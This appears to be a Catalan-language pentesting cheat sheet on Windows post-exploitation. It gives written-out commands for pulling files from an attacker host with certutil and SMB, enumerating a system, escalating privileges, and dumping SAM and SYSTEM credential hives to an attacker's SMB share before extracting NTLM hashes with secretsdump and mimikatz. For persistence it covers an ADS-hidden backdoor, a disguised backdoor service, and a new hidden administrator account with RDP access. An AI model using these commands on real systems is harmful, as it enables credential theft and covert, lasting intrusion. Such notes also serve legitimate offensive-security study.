# Windows post-exploitation
## Utilities
##### File Transfer
```bash
# HTTP
python -m http.server [port] # Atacant
certutil -f -urlcache http://[ip]:[port]/[file] [output] # Víctima

# SMB
impacket-smbserver [folder] $(pwd) -smb2suport # Atacant
copy \\[ip]\[folder]\[file] [output] # Víctima
```
##### UAC Bypass
L'_User Access Control_ és un panell de confirmació d'execució amb privilegis, i d'introducció de credencials d'administrador si s'escau. Té diferents nivells de seguretat, de baix fins a alt, i hi ha tècniques per poder esquivar-lo, sempre que es tingui accés amb un usuari dins el grup d'administradors.

Per aquesta tècnica, s'utilitza l'eina [UACMe](https://github.com/hfiref0x/UACME) o i es pot trobar una demostració a la màquina [Napper](https://www.youtube.com/watch?v=yKNxdxixfHg) de HTB.
## Local enumeration
--> **Hostname, OS Name, OS Build, Service Pack, OS architecture & hotfixes**
```
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
C:/Windows/System32/eula.txt
```
--> **Current user & privileges, user info, other users, groups, members of the admin group**
```
whoami [/priv]
query user
net users
net user [user]
net localgroup [group]
```
--> **IP, Network Adapter, Internal Networks, TCP/UPD services, hosts, routing, firewall**
```
ipconfig /all
route print
arp -a 
netstat -ano
netsh advfirewall show allprofiles
```
--> **Processes, services, scheduled tasks**
```
tasklist /v | findstr [process]
net start
wmic service list brief
tasklist /SVC
schtasks /query /fo /v LIST
```
> Es pot automatitzar aqauesta enumeració amb [JAWS](https://github.com/411Hall/JAWS) o [WinPEAS](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md).
## Privilege escalation
##### Kernel exploits
El kerne és el "sistema nerviós central" del Sistema Operatiu. Fa la funció de traducció entre el hardware i el software del dispositiu, i té control sobre els recursos i el hardware del sistema. En el cas de windows, el kernel és Windows NT i té dos modes, per qüestions de seguretat: User Mode, amb accés limitat, i System Mode, amb accés total.

All llarg dels anys, han anat sortit diferents vulnerabilitats que afecten al kernel de Windows i que, per tant, permetrien augmentar els privilegis de l'atacant al nivell del sistema. L'enumeració manual de totes les vulnerabilitats és massa tediosa, així que se sol utilitzar [sherlock.ps1](, [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1), [PowerUP](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) o [WinPEAS](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md).
##### Access Token Impersonation
Els Access Token, creats per LSASS, són un element clau del procés d'autenticació de Windows. Serveixen per identificar el context de seguretat i privilegis d’un procés o tasca corrent al sistema, és a dir, com una mena de cookie associada a l’usuari que permet accedir al procés sense haver de proporcionar credencials cada cop. N'hi ha de dos tipus:
- **Impersonate-level:** permet a un procés o thread assumir temporalment la identitat d'un altre usuari. 
- **Delegate-level:** mateixa funció que el impersonate-level però permet passar les credencials a altres sistemes de la xarxa.
La condició principal per a que pugui donar-se el Access Token Impersionation és que hi hagi un dels següents tokens activats: **SeAssignPrimaryToken, SeCreateToken** o **SeImpersonatePrivilege**

Les eines emprades en aquesta tècnica són [FullPowers](https://github.com/itm4n/FullPowers) i [PrintSpoofer.exe](https://github.com/dievus/printspoofer).
##### Config files
Quan un sysadmin configura diversos equips a la vegada, té la possibilitat d'utilitzar una "Unattended Installation", una instal·lació en massa de tots els sistemes amb la mateixa configuració. 

Aquesta instal·lació deixa, posteriorment, un arxiu amb les credencials de l'Administrador que s'han utilitzat per la instal·lació, en text pla o en base64. La localització normal d'aquest arxiu és _C:\Windows\Panther\Unattend.xml_.

> La Santa Bíblia del PrivEsc a Windows: [Windows PrivEsc](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/).
## Persistence
##### Alternate Data Streams
Els ADS són un atribut de NTFS (_New Technology File System)_ dissenyat per proporcionar compatibilitat amb MacOS. Permet emmagatzemar metainformació amb un fitxer dins el propi fitxer. Serveix per amagar codi maliciós en les metadades d'arxius legítims, evadint la detecció de l'antivirus i d'un escaneig.
```bash
# exemple d'arxiu de text amb el backdoor a la metadata
notepad.exe [file]:[backdoor]
mklink [program] [file]:[backdoor] # executar backdoor quan s'executi el programa
```
##### Pass-the-hash
És l'ús de hashes NTLM sense crackejar per autenticar-se al servei objectiu. No és ben bé una explotació del servei sinó una funcionalitat, així que tot i que sigui una vulnerabilitat coneguda seguirà podent utilitzar-se en actualitzacions futures. Per extreure els hashes NTLM de la màquina víctima es necessiten privilegis d'administrador, ja que s'ha d'interactuar amb els registres de Windows SAM y SYSTEM. Es pot fer de les següents maneres:
```bash
# Manualment: 
# A la màquina víctima
reg save HKLM\sam [file]
reg save HKLM\system [file2]
# A la màquina atacant
impacket-smbserver [folder] $(pwd) -smb2support
# A la màquina víctima
copy [file(2)] \\[ip-atacant]\[folder]\[output-file]
# A la màquina atacant
impacket-secretsdump -sam [file1] -system [file2] LOCAL

# crackmapexec
crackmapexec smb -u [user] -p [pass] --sam

# mimikatz (binari pujat a la màquina víctima)
lsa_dump_sam
```
##### Services
Amb privilegis d'administrador, és possible crear un servei que s'executi de forma arbitrària en certes ocasions, per exemple a l'arrencada del sistema. Aquest servei hauria de contenir el backdoor que pogués estaular una consola interactiva al nostre host.
```powershell
New-Service -Name "Backdoor" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -Description "Nothing to see here." -StartupType Automatic \ sc start Backdoor
```
##### RDP
Encara que no estigui activat, un cop a dins de la màquina víctima i amb privilegis d'administrador és possible obrir el servei de RDP i crear un usuari propi per poder accedir-hi.
```bash
# Atacant
crackmapexec -u [user] -p [pass] -M rdp --action=enable # Obrir RDP

# Víctima
net user [user] [pass] /add # Crear nou usuari
net localgroup Administrators [user] /add # Donar privilegis d'admin a l'usuari
net localgroup "Remote Desktop Users" [user] /add # Poder accedir amb RDP
```
> La Santa Bíblia de la persistència a Windows: [Windows Persistence](https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/windows-persistence/).
 
